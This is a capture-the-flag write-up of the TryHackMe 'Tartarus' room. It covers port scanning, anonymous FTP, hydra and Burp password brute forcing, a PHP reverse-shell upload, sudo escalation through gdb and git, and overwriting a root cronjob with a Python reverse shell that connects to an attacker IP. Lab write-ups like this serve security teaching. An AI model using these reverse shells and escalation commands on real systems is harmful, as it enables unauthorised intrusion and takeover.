---
title: Writeup - THM - Tartarus
author: Fr3akazo1d!
date: 2020-10-27 23:14:00 +0100
categories: [Hacking, CTF]
tags: [tryhackeme, tartarus, hacking, pwned, nmap, gobuster, cronjob]
image: /assets/img/thm-images/tartarus-thm.png
---
# General Information

| Room        | Date        | Difficulty | Tags                               | Time |
| ----------- | ----------- | ---------- | ---------------------------------- | ---- |
| Tartarus    | 25.10.2020  | Easy       | Security, ctf, dirbuster, tartarus | 2h   |


# Used Programs

| Program  | Command |
| --------- | -------- |
| namp     | nmap -sC -sV -oN nmap/initial|
| rustscan | rustscan $ip --ulimit 5000 -- -sC -sV -oN nmap/initial  tee output |
| gobuster | gobuster dir -u http://10.10.213.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | 
| dirsearch | python /git/dirsearch/dirsearch.py -u 10.10.213.137 -e php,html |
| ftp |ftp 10.10.213.137 |
| Burp-Suite | GUI |
| hydra | hydra -l e##x -P c#########s.txt 10.10.213.137 http-post-form "/s##########t/a##########e.php:username=^USER^&password=^PASS^&Login:Incorrect password! " |
| pwncat | ppwncat --config /git/pwncat/data/pwncatrc -p 9910 -l |

## Rustscan-Output

The first step is always to run a network scan on the Target. For the last weeks i am using Rustscan. This is a very fast Network-Scanner. He Scans all the ports and then made a nmap scan on the open ports.

Below the Output of the rustscan.

```sh
     _____           _    _____
    |  __ \         | |  / ____|
    | |__) |   _ ___| |_| (___   ___ __ _ _ __
    |  _  / | | / __| __|\___ \ / __/ _` | '_ \
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
    Faster nmap scanning with rust.

Automatically upping ulimit to 5000
Open 22
Open 21
Open 80
Starting nmap.
The Nmap command to be run is -sC -sV -oN nmap/initial -vvv -Pn -p 22,21,80 10.10.213.137
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-25 22:12 CET
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:12
Completed Parallel DNS resolution of 1 host. at 22:12, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:12
Scanning 10.10.213.137 [3 ports]
Discovered open port 22/tcp on 10.10.213.137
Discovered open port 21/tcp on 10.10.213.137
Discovered open port 80/tcp on 10.10.213.137
Completed Connect Scan at 22:12, 0.06s elapsed (3 total ports)
Initiating Service scan at 22:12
Scanning 3 services on 10.10.213.137
Completed Service scan at 22:12, 6.45s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.213.137.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
NSE: [ftp-bounce 10.10.213.137:21] PORT response: 500 Illegal PORT command.
Completed NSE at 22:12, 2.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.52s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Nmap scan report for 10.10.213.137
Host is up, received user-set (0.062s latency).
Scanned at 2020-10-25 22:12:42 CET for 9s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.170.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZdORUZHg9RjrmmXa0kKVVlArZPd+zITEEkyYL1gzvyCHE9mu9jWkpuuwZRk8lrar+exGSTNcz/9wijYrGftUA/tJZ/4WRsHTbl6taJr7UYRoCgpNy0wXC3+oC5wfIdh3Lgah4MozwRPGJ5DQE+zIIf0sVlK2T2jxFXDjuxULdWM8TPjfsBjBcu55RZ6/iBC69LRp8AtKTVCe502yaUCRKM8GbxU7zVmsSAZxUOSDyB4u8uJ+IhS7oTy9PCHLmsHg899BozsFe+LArsxloL032VDsh9ZfUFiXhj3FSze49Wk32xX4s/atQJwpCxabtCCKjTMREwEbg/7z5UU+euBsL
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJMh3A9yhxjDCJIcY6+SceWHxorSphXU0Jpvk8tfBkX4MsebBRvPq3SnRw5PfPLz7Nkk7xWDIcbPHsmTvMcmOLs=
|   256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7R6jyxhQlyAs1SlBzJnXw4dHC28Tz+uMKKiNJ6AjUp
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:12
Completed NSE at 22:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
```

## Enumeration FTP

Rustscan shows me that anonymous login is available on the Target. 

```sh
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.170.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

Checked FTP-Server, found 2 files

```sh 
ftp $ip
Connected to 10.10.213.137.
220 (vsFTPd 3.0.3)
Name (10.10.213.137:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (29.2797 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ###
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 t##t.txt
226 Directory send OK.
ftp> cd ###
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ###
226 Directory send OK.
ftp> cd ###
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 y############s.txt 
226 Directory send OK.
ftp> get y############s.txt
local: y############s.txt remote: y############s.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for y############s.txt (14 bytes).
226 Transfer complete.
14 bytes received in 0.04 secs (0.3388 kB/s)
ftp> 
```

Interessting file is y############s.txt this containts a Secret Site on the Web-Server

```sh
bat y############s.txt.txt
───────┬──────────────────────────────────────────────────────────────────────────
       │ File: y############s.txt
───────┬────────────
───────┼──────────────────────────────────────────────────────────────────────────
   1   │ /s###########t
───────┴──────────────────────────────────────────────────────────────────────────
```

Web-Site is a login page. Try to Enumerate a username and a Password. 

Run dirsearch over the web-Server:

```sh
┌──(fr3akazo1d💻fr3ak0ut)-[~/PenetrationTesting/THM/Boxes/Tartarus]
└─$python3 /git/dirsearch/dirsearch.py -u 10.10.213.137 -e html,php      

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 7507

Error Log: /git/dirsearch/logs/errors-20-10-25_22-38-12.log

Target: http://10.10.213.137/

Output File: /git/dirsearch/reports/10.10.213.137/_20-10-25_22-38-12.txt

[22:38:12] Starting: 
[22:38:16] 403 -  278B  - /.htaccess.bak1
[22:38:16] 403 -  278B  - /.htaccess.orig
[22:38:16] 403 -  278B  - /.htaccess.sample
[22:38:16] 403 -  278B  - /.htaccess.save
[22:38:16] 403 -  278B  - /.htm
[22:38:16] 403 -  278B  - /.html
[22:38:16] 403 -  278B  - /.htaccessBAK
[22:38:16] 403 -  278B  - /.htaccessOLD
[22:38:16] 403 -  278B  - /.htaccessOLD2
[22:38:16] 403 -  278B  - /.httr-oauth
[22:38:17] 403 -  278B  - /.php
[22:38:35] 200 -   11KB - /index.html
[22:38:42] 200 -   83B  - /robots.txt
[22:38:42] 403 -  278B  - /server-status
[22:38:42] 403 -  278B  - /server-status/

Task Completed
```
## Checked Robots.txt

In the robots.txt file i find a hint for the next steps. 

```sh
bat robots.txt                         
───────┬──────────────────────────────────────────────────────────────────────────
       │ File: robots.txt
───────┼──────────────────────────────────────────────────────────────────────────
   1   │ User-Agent: *
   2   │ Disallow : /a######r
   3   │ 
   4   │ I told d###h we should hide our things deep.
───────┴──────────────────────────────────────────────────────────────────────────
```

In the Directory there are two files, witch are interesting. 

c#########s.txt and u####d. 

I decided to go with Burb-Suite to brute force the username and password.  

Burp-Suite was able to find a username: "e##x" 
Now i have the username i will check the password for the username. Also with Burp-Suite. 
I tried with hydra, but hydra provided me more password witch i needed. 
The command for hydra is in the top of the writeup. 

Burp-Suite found the Password for user: P##########4

After the login, we are on a Upload page where we can upload files to the Web-Server. 

Testet the Upload page with a php file, to check if i can upload a php file to the webserver.

PHP files are not blocked from the upload so i can upload the php-reverse-shell.php file from PTM.

The file is uploaded to the folder "/images/uploads/"

When the file was uploaded, i navigate to the upload directory and startet a listener on my target. As a listener i was going with pwncat, this was my first Room where i tried Pwncat.  

Open the shell scirpt on the target and pwncat got a reverse conneciton.

```sh
┌──(fr3akazo1d💻fr3ak0ut)-[~/PenetrationTesting/THM/Boxes/Tartarus]
└─$ pwncat --config /git/pwncat/data/pwncatrc -p 9901 -l
[23:10:52] error: data/pwncat: no such file or directory                 set.py:96
[23:10:57] received connection from 10.10.213.137:55058             connect.py:255
[23:10:57] new host w/ hash 7906cf3f08612e1f4824c25902d5d224         victim.py:321
[23:11:01] pwncat running in /bin/sh                                                                                                                        victim.py:354
[23:11:02] pwncat is ready 🐈                                                                                                                               victim.py:771
(remote) www-data@ubuntu-xenial:/$ 
(remote) www-data@ubuntu-xenial:/$ 
```
## Acess to target

When i got access to the target i always check if the user can run a command with sudo and no Password. 
When i got the shell on the Target i was the user "www-data".

```sh
(remote) www-data@ubuntu-xenial:/home/thirtytwo$ sudo -l
Matching Defaults entries for www-data on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb
```

The user www-data can run a command with the user thirtytwo. 
Now lets have a look into the gdb file witch i can run as user. 
gtfobins give me this. 

```sh
sudo gdb -nx -ex '!sh' -ex quit
```

I try to run the command with the user thirtytwo:

```sh
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```

After running this command i'm the user Thirtytwo. 

Check again with sudo -l i can run "git" as sudo without a password. 
Checked again GTFOBins for some Sudo commands for git. 

```sh
(remote) thirtytwo@ubuntu-xenial:/home/thirtytwo$ sudo -l
Matching Defaults entries for thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
```

Will try this command:
```sh
sudo -u d4rckh /usr/bin/git -p help config
!/bin/sh
```

now i am the user d4rckh. 
In the home directory there is the "user.flag" file
user flag: 0#############################f

Now i can got for the Root user. 

## Getting Root-Access

Checked the user directory and found the file cleanup.py. 
After some enumerating, i found out that the file is running every 2 minutes as a cronjob with the user root. 

I decided to change the file, that a reverse shell will open to my client. 

used this python script:

```py
# =*- coding: utf-8 -*-
#!/usr/bin/env python

import socket, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.170.39",9910))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system("/bin/sh -i")
```

started a listner on my machine. Pwncat got an error when the conntection should be open. then i decided to go for a standard nc listener. 

```sh
nc -lnvp 9910
```

after 2 minutes i got a root shell and could read the root.txt file.

root.txt: 

```sh

#cat root.txt
7#############################d
```
---

## Conclusion

This box was interessting. The learing was about the enumerating the user on the box and get to the root user. 
